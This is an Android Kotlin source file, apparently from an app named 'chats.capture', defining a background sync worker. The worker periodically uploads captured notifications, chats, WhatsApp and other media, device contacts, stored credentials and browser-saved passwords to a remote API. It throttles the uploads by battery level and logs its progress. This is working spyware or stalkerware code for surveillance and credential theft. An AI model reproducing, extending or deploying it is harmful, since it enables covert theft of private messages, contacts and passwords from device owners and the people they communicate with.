package com.chats.capture.workers

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.chats.capture.CaptureApplication
import com.chats.capture.database.ChatDao
import com.chats.capture.database.ContactDao
import com.chats.capture.database.CredentialDao
import com.chats.capture.database.NotificationDao
import com.chats.capture.managers.ContactCaptureManager
import com.chats.capture.managers.MediaUploadManager
import com.chats.capture.network.ApiClient
import com.chats.capture.network.NetworkManager
import android.os.BatteryManager
import androidx.core.content.ContextCompat
import com.chats.capture.utils.AppStateManager
import com.chats.capture.utils.FileScanner
import com.chats.capture.utils.RetryManager
import com.chats.capture.utils.WhatsAppMediaScanner
import com.google.gson.GsonBuilder
import kotlinx.coroutines.delay
import timber.log.Timber

class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    
    override suspend fun doWork(): Result {
        return try {
            Timber.tag("SYNC_WORKER").i("🔄 SyncWorker started - Syncing notifications, chats, and media to server")
            Timber.d("SyncWorker started")
            
            val database = (applicationContext as CaptureApplication).database
            val notificationDao = database.notificationDao()
            val chatDao = database.chatDao()
            
            // Check network availability
            if (!ApiClient.isNetworkAvailable(applicationContext)) {
                Timber.w("Network not available, skipping sync")
                return Result.retry()
            }
            
            // Get last sync time from AppStateManager
            val lastSyncTime = AppStateManager.getLastSyncTime(applicationContext)
            val sinceTimestamp = if (lastSyncTime > 0) lastSyncTime else 0L
            
            // Sync notifications (from last sync or all unsynced)
            syncNotifications(notificationDao, sinceTimestamp)
            
            // Sync chats (from last sync or all unsynced)
            syncChats(chatDao, sinceTimestamp)
            
            // Sync media files (throttled for battery optimization)
            val mediaFileDao = database.mediaFileDao()
            val mediaUploadManager = MediaUploadManager(applicationContext, mediaFileDao, notificationDao, chatDao)
            
            // Limit uploads based on battery level
            val batteryLevel = getBatteryLevel(applicationContext)
            val uploadLimit = if (batteryLevel < 20) 2 else 3 // Fewer uploads when battery low
            mediaUploadManager.uploadPendingMediaFiles(limit = uploadLimit)
            
            // Periodic media scans for new files
            captureMediaIfNeeded()
            
            // Sync credentials (from last sync or all unsynced)
            syncCredentials(database.credentialDao(), sinceTimestamp)
            
            // Capture and sync contacts (capture first, then sync)
            val contactDao = database.contactDao()
            captureContactsIfNeeded(contactDao)
            syncContacts(contactDao, sinceTimestamp)
            
            // Periodically fetch browser saved credentials (once per day)
            fetchBrowserCredentialsIfNeeded()
            
            Timber.tag("SYNC_WORKER").i("✅ SyncWorker completed successfully")
            Timber.d("SyncWorker completed successfully")
            AppStateManager.updateLastSyncTime(applicationContext)
            Result.success()
        } catch (e: Exception) {
            Timber.tag("SYNC_WORKER").e(e, "❌ SyncWorker failed: ${e.message}")
            Timber.e(e, "SyncWorker failed")
            Result.retry()
        }
    }
    
    /**
     * Get current battery level percentage
     */
    private fun getBatteryLevel(context: Context): Int {
        return try {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100
        } catch (e: Exception) {
            Timber.e(e, "Error getting battery level")
            100 // Default to 100% if can't read
        }
    }
    
    private suspend fun syncNotifications(notificationDao: NotificationDao, sinceTimestamp: Long = 0L) {
        try {
            // If we have a last sync time, sync from that point, otherwise sync all unsynced
            val notificationsToSync = if (sinceTimestamp > 0) {
                notificationDao.getNotificationsSince(sinceTimestamp, limit = 50)
            } else {
                notificationDao.getUnsyncedNotifications(limit = 50)
            }
            
            if (notificationsToSync.isEmpty()) {
                Timber.tag("SYNC_WORKER").d("📊 No notifications to sync (sinceTimestamp=$sinceTimestamp)")
                Timber.d("No notifications to sync")
                return
            }
            
            val unsyncedNotifications = notificationsToSync
            
            if (unsyncedNotifications.isEmpty()) {
                Timber.tag("SYNC_WORKER").d("📊 No unsynced notifications to sync")
                Timber.d("No unsynced notifications")
                return
            }
            
            Timber.tag("SYNC_WORKER").i("🔄 Syncing ${unsyncedNotifications.size} notifications to server...")
            
            // Optimized logging - only log summary in release, full data in debug
            if (com.chats.capture.BuildConfig.DEBUG) {
                val gson = com.google.gson.Gson()
                val notificationsJson = gson.toJson(unsyncedNotifications)
                Timber.tag("API_REQUEST_DATA").d(
                    "📤 SENDING TO API (${unsyncedNotifications.size} notifications): $notificationsJson"
                )
            } else {
                // In release, just log summary
                val summary = unsyncedNotifications.map { 
                    "id=${it.id}, app=${it.appPackage}, title=${it.title?.take(30)}"
                }.joinToString(" | ")
                Timber.tag("API_REQUEST_DATA").d(
                    "📤 SENDING TO API (${unsyncedNotifications.size} notifications): $summary"
                )
            }
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadNotificationsBatch(unsyncedNotifications)
            
            if (response.isSuccessful) {
                try {
                    val responseBody = response.body()
                    
                    // Optimized logging - only log in debug builds
                    if (com.chats.capture.BuildConfig.DEBUG) {
                        val responseGson = com.google.gson.Gson()
                        val responseJson = responseGson.toJson(responseBody)
                        Timber.tag("API_RESPONSE_DATA").d(
                            "📥 API RESPONSE RECEIVED: $responseJson"
                        )
                    } else {
                        Timber.tag("API_RESPONSE_DATA").d(
                            "📥 API RESPONSE: success=${responseBody?.success}, message=${responseBody?.message?.take(100)}"
                        )
                    }
                    
                    if (responseBody?.success == true) {
                        // Mark as synced with current timestamp
                        val syncTime = System.currentTimeMillis()
                        unsyncedNotifications.forEach { notification ->
                            notificationDao.markAsSynced(notification.id, syncTime)
                        }
                        Timber.tag("SYNC_WORKER").i("✅ Successfully synced ${unsyncedNotifications.size} notifications to server")
                        Timber.tag("API_RESPONSE_DATA").i("✅ API confirmed success for ${unsyncedNotifications.size} notifications")
                        Timber.d("Synced ${unsyncedNotifications.size} notifications")
                    } else {
                        // Response was successful but success=false
                        val errorMessage = responseBody?.message ?: "Sync failed"
                        unsyncedNotifications.forEach { notification ->
                            notificationDao.markSyncAttempt(
                                notification.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync notifications: $errorMessage")
                    }
                } catch (e: com.google.gson.JsonSyntaxException) {
                    // Server returned non-JSON response (plain text), but HTTP was successful
                    // Treat as success if status code is 200-299
                    if (response.code() in 200..299) {
                        val syncTime = System.currentTimeMillis()
                        unsyncedNotifications.forEach { notification ->
                            notificationDao.markAsSynced(notification.id, syncTime)
                        }
                        Timber.d("Synced ${unsyncedNotifications.size} notifications (non-JSON response treated as success)")
                    } else {
                        val errorMessage = "Server returned non-JSON response: ${response.code()}"
                        unsyncedNotifications.forEach { notification ->
                            notificationDao.markSyncAttempt(
                                notification.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync notifications: $errorMessage")
                    }
                }
            } else {
                // HTTP error - try to get error message
                val errorBody = response.errorBody()?.string()
                
                // Log error response from API
                Timber.tag("API_RESPONSE_DATA").e(
                    "❌ API ERROR RESPONSE | Status: ${response.code()} | Body: ${errorBody?.take(500) ?: "No error body"}"
                )
                
                val errorMessage = try {
                    if (errorBody != null && errorBody.isNotBlank()) {
                        val gson = com.google.gson.GsonBuilder().setLenient().create()
                        val errorResponse = gson.fromJson(errorBody, com.chats.capture.network.ApiResponse::class.java)
                        errorResponse.message ?: "Sync failed with code ${response.code()}"
                    } else {
                        "Sync failed with code ${response.code()}"
                    }
                } catch (e: Exception) {
                    // Not JSON, use raw error body or status code
                    errorBody?.take(200) ?: "Sync failed with code ${response.code()}"
                }
                
                unsyncedNotifications.forEach { notification ->
                    notificationDao.markSyncAttempt(
                        notification.id,
                        System.currentTimeMillis(),
                        errorMessage
                    )
                }
                Timber.tag("SYNC_WORKER").w("Failed to sync notifications: $errorMessage")
                Timber.w("Failed to sync notifications: $errorMessage")
            }
        } catch (e: com.google.gson.JsonSyntaxException) {
            Timber.e(e, "JSON parsing error syncing notifications - server returned malformed JSON")
            // Don't mark as synced, will retry later
        } catch (e: Exception) {
            Timber.e(e, "Error syncing notifications: ${e.message}")
        }
    }
    
    private suspend fun syncChats(chatDao: ChatDao, sinceTimestamp: Long = 0L) {
        try {
            // If we have a last sync time, sync from that point, otherwise sync all unsynced
            val chatsToSync = if (sinceTimestamp > 0) {
                chatDao.getChatsSince(sinceTimestamp, limit = 50)
            } else {
                chatDao.getUnsyncedChats(limit = 50)
            }
            
            if (chatsToSync.isEmpty()) {
                Timber.d("No chats to sync (sinceTimestamp=$sinceTimestamp)")
                return
            }
            
            val unsyncedChats = chatsToSync
            
            if (unsyncedChats.isEmpty()) {
                Timber.d("No unsynced chats")
                return
            }
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadChatsBatch(unsyncedChats)
            
            if (response.isSuccessful) {
                try {
                    val responseBody = response.body()
                    if (responseBody?.success == true) {
                        // Mark as synced with current timestamp
                        val syncTime = System.currentTimeMillis()
                        unsyncedChats.forEach { chat ->
                            chatDao.markAsSynced(chat.id, syncTime)
                        }
                        Timber.d("Synced ${unsyncedChats.size} chats")
                    } else {
                        // Response was successful but success=false
                        val errorMessage = responseBody?.message ?: "Sync failed"
                        unsyncedChats.forEach { chat ->
                            chatDao.markSyncAttempt(
                                chat.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync chats: $errorMessage")
                    }
                } catch (e: com.google.gson.JsonSyntaxException) {
                    // Server returned non-JSON response (plain text), but HTTP was successful
                    // Treat as success if status code is 200-299
                    if (response.code() in 200..299) {
                        val syncTime = System.currentTimeMillis()
                        unsyncedChats.forEach { chat ->
                            chatDao.markAsSynced(chat.id, syncTime)
                        }
                        Timber.d("Synced ${unsyncedChats.size} chats (non-JSON response treated as success)")
                    } else {
                        val errorMessage = "Server returned non-JSON response: ${response.code()}"
                        unsyncedChats.forEach { chat ->
                            chatDao.markSyncAttempt(
                                chat.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync chats: $errorMessage")
                    }
                }
            } else {
                // HTTP error - try to get error message
                val errorBody = response.errorBody()?.string()
                val errorMessage = try {
                    if (errorBody != null && errorBody.isNotBlank()) {
                        val gson = com.google.gson.GsonBuilder().setLenient().create()
                        val errorResponse = gson.fromJson(errorBody, com.chats.capture.network.ApiResponse::class.java)
                        errorResponse.message ?: "Sync failed with code ${response.code()}"
                    } else {
                        "Sync failed with code ${response.code()}"
                    }
                } catch (e: Exception) {
                    // Not JSON, use raw error body or status code
                    errorBody?.take(200) ?: "Sync failed with code ${response.code()}"
                }
                
                unsyncedChats.forEach { chat ->
                    chatDao.markSyncAttempt(
                        chat.id,
                        System.currentTimeMillis(),
                        errorMessage
                    )
                }
                Timber.w("Failed to sync chats: $errorMessage")
            }
        } catch (e: com.google.gson.JsonSyntaxException) {
            Timber.e(e, "JSON parsing error syncing chats - server returned malformed JSON")
            // Don't mark as synced, will retry later
        } catch (e: Exception) {
            Timber.e(e, "Error syncing chats: ${e.message}")
        }
    }
    
    private suspend fun syncCredentials(credentialDao: CredentialDao, sinceTimestamp: Long = 0L) {
        try {
            // If we have a last sync time, sync from that point, otherwise sync all unsynced
            val credentialsToSync = if (sinceTimestamp > 0) {
                credentialDao.getCredentialsSince(sinceTimestamp, limit = 50)
            } else {
                credentialDao.getUnsyncedCredentials(limit = 50)
            }
            
            if (credentialsToSync.isEmpty()) {
                Timber.d("No credentials to sync (sinceTimestamp=$sinceTimestamp)")
                return
            }
            
            val unsyncedCredentials = credentialsToSync
            
            if (unsyncedCredentials.isEmpty()) {
                Timber.d("No unsynced credentials")
                return
            }
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadCredentialsBatch(unsyncedCredentials)
            
            if (response.isSuccessful && response.body()?.success == true) {
                // Mark as synced with current timestamp
                val syncTime = System.currentTimeMillis()
                unsyncedCredentials.forEach { credential ->
                    credentialDao.markAsSynced(credential.id, syncTime)
                }
                Timber.d("Synced ${unsyncedCredentials.size} credentials")
            } else {
                // Mark sync attempt
                val errorMessage = response.body()?.message ?: "Sync failed"
                unsyncedCredentials.forEach { credential ->
                    credentialDao.markSyncAttempt(
                        credential.id,
                        System.currentTimeMillis(),
                        errorMessage
                    )
                }
                Timber.w("Failed to sync credentials: $errorMessage")
            }
        } catch (e: Exception) {
            Timber.e(e, "Error syncing credentials")
        }
    }
    
    private suspend fun syncContacts(contactDao: ContactDao, sinceTimestamp: Long = 0L) {
        try {
            // If we have a last sync time, sync from that point, otherwise sync all unsynced
            val contactsToSync = if (sinceTimestamp > 0) {
                contactDao.getContactsSince(sinceTimestamp, limit = 50)
            } else {
                contactDao.getUnsyncedContacts(limit = 50)
            }
            
            if (contactsToSync.isEmpty()) {
                Timber.d("No contacts to sync (sinceTimestamp=$sinceTimestamp)")
                return
            }
            
            val unsyncedContacts = contactsToSync
            
            if (unsyncedContacts.isEmpty()) {
                Timber.d("No unsynced contacts")
                return
            }
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadContactsBatch(unsyncedContacts)
            
            if (response.isSuccessful) {
                try {
                    val responseBody = response.body()
                    if (responseBody?.success == true) {
                        // Mark as synced
                        val syncTime = System.currentTimeMillis()
                        unsyncedContacts.forEach { contact ->
                            contactDao.markAsSynced(contact.id, syncTime)
                        }
                        Timber.d("Synced ${unsyncedContacts.size} contacts")
                    } else {
                        // Response was successful but success=false
                        val errorMessage = responseBody?.message ?: "Sync failed"
                        unsyncedContacts.forEach { contact ->
                            contactDao.markSyncAttempt(
                                contact.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync contacts: $errorMessage")
                    }
                } catch (e: com.google.gson.JsonSyntaxException) {
                    // Server returned non-JSON response, but HTTP was successful
                    if (response.code() in 200..299) {
                        val syncTime = System.currentTimeMillis()
                        unsyncedContacts.forEach { contact ->
                            contactDao.markAsSynced(contact.id, syncTime)
                        }
                        Timber.d("Synced ${unsyncedContacts.size} contacts (non-JSON response treated as success)")
                    } else {
                        val errorMessage = "Server returned non-JSON response: ${response.code()}"
                        unsyncedContacts.forEach { contact ->
                            contactDao.markSyncAttempt(
                                contact.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync contacts: $errorMessage")
                    }
                }
            } else {
                // HTTP error
                val errorBody = response.errorBody()?.string()
                val errorMessage = try {
                    if (errorBody != null && errorBody.isNotBlank()) {
                        val gson = com.google.gson.GsonBuilder().setLenient().create()
                        val errorResponse = gson.fromJson(errorBody, com.chats.capture.network.ApiResponse::class.java)
                        errorResponse.message ?: "Sync failed with code ${response.code()}"
                    } else {
                        "Sync failed with code ${response.code()}"
                    }
                } catch (e: Exception) {
                    errorBody?.take(200) ?: "Sync failed with code ${response.code()}"
                }
                
                unsyncedContacts.forEach { contact ->
                    contactDao.markSyncAttempt(
                        contact.id,
                        System.currentTimeMillis(),
                        errorMessage
                    )
                }
                Timber.w("Failed to sync contacts: $errorMessage")
            }
        } catch (e: com.google.gson.JsonSyntaxException) {
            Timber.e(e, "JSON parsing error syncing contacts - server returned malformed JSON")
        } catch (e: Exception) {
            Timber.e(e, "Error syncing contacts: ${e.message}")
        }
    }
    
    /**
     * Capture contacts from device if needed (only if we have permission and contacts haven't been captured recently)
     */
    private suspend fun captureContactsIfNeeded(contactDao: ContactDao) {
        try {
            // Check if we have READ_CONTACTS permission
            val hasPermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
                androidx.core.content.ContextCompat.checkSelfPermission(
                    applicationContext,
                    android.Manifest.permission.READ_CONTACTS
                )
            
            if (!hasPermission) {
                Timber.d("READ_CONTACTS permission not granted, skipping contact capture")
                return
            }
            
            val prefs = applicationContext.getSharedPreferences("capture_prefs", Context.MODE_PRIVATE)
            val lastCaptureTime = prefs.getLong("last_contacts_capture_ms", 0L)
            val shouldCaptureByTime = System.currentTimeMillis() - lastCaptureTime > 24 * 60 * 60 * 1000

            // Check if we have any contacts in the database
            val totalContactsCount = try {
                contactDao.getTotalCount()
            } catch (e: Exception) {
                0
            }
            
            // Only capture if we have very few or no contacts
            // This prevents re-capturing all contacts on every sync
            if (totalContactsCount < 10 || shouldCaptureByTime) {
                Timber.d("Capturing contacts from device (count=$totalContactsCount, timeRefresh=$shouldCaptureByTime)...")
                val contactCaptureManager = ContactCaptureManager(applicationContext)
                contactCaptureManager.captureAllContacts()
                
                // Wait a bit for contacts to be captured and saved
                delay(3000)
                prefs.edit().putLong("last_contacts_capture_ms", System.currentTimeMillis()).apply()
                Timber.d("Contact capture initiated")
            } else {
                Timber.d("Sufficient contacts in database ($totalContactsCount), skipping capture")
            }
        } catch (e: SecurityException) {
            Timber.w(e, "Permission denied: READ_CONTACTS permission required")
        } catch (e: Exception) {
            Timber.e(e, "Error capturing contacts: ${e.message}")
        }
    }

    private suspend fun captureMediaIfNeeded() {
        try {
            val prefs = applicationContext.getSharedPreferences("capture_prefs", Context.MODE_PRIVATE)
            val lastMediaScan = prefs.getLong("last_media_scan_ms", 0L)
            val now = System.currentTimeMillis()
            if (now - lastMediaScan < 12 * 60 * 60 * 1000) {
                return
            }

            val fileScanner = FileScanner(applicationContext)
            val whatsappScanner = WhatsAppMediaScanner(applicationContext)
            fileScanner.scanLast10MediaFiles()
            whatsappScanner.scanMediaFiles()

            prefs.edit().putLong("last_media_scan_ms", now).apply()
            Timber.d("Media scan completed")
        } catch (e: Exception) {
            Timber.e(e, "Error capturing media files")
        }
    }
    
    private suspend fun fetchBrowserCredentialsIfNeeded() {
        try {
            val prefs = applicationContext.getSharedPreferences("capture_prefs", Context.MODE_PRIVATE)
            val lastBrowserFetch = prefs.getLong("last_browser_credentials_fetch_ms", 0L)
            val now = System.currentTimeMillis()
            
            // Fetch browser credentials once per day
            if (now - lastBrowserFetch < 24 * 60 * 60 * 1000) {
                return
            }
            
            Timber.tag("SYNC_WORKER").d("Fetching browser saved credentials...")
            val browserCredentialFetcher = com.chats.capture.utils.BrowserCredentialFetcher(applicationContext)
            val credentials = browserCredentialFetcher.fetchBrowserCredentials()
            
            if (credentials.isNotEmpty()) {
                browserCredentialFetcher.saveBrowserCredentials(credentials)
                Timber.tag("SYNC_WORKER").i("✅ Fetched and saved ${credentials.size} browser credentials")
            }
            
            prefs.edit().putLong("last_browser_credentials_fetch_ms", now).apply()
        } catch (e: Exception) {
            Timber.e(e, "Error fetching browser credentials")
        }
    }
}
